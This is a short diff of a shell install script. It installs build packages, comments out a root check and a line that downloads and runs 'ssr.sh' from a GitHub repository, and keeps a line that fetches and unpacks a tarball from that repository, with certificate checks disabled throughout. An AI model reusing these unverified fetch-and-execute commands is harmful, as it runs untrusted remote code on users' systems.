@@ -16,7 +16,7 @@ Get_IP(){
 	fi
 }
 
-check_root
+# check_root
 
 p_address=$1
 x_tar="$2.tar.gz"
@@ -27,7 +27,7 @@ echo -e "x_tar -> ${x_tar}"
 sudo apt-get update
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 
-wget -N --no-check-certificate "https://raw.githubusercontent.com/jbs12/reader/master/ssr.sh" && chmod +x ssr.sh && bash ssr.sh
+# wget -N --no-check-certificate "https://raw.githubusercontent.com/jbs12/reader/master/ssr.sh" && chmod +x ssr.sh && bash ssr.sh
 
 wget -N --no-check-certificate "https://raw.githubusercontent.com/jbs12/reader/master/${x_tar}" && tar zxvf ${x_tar}
 
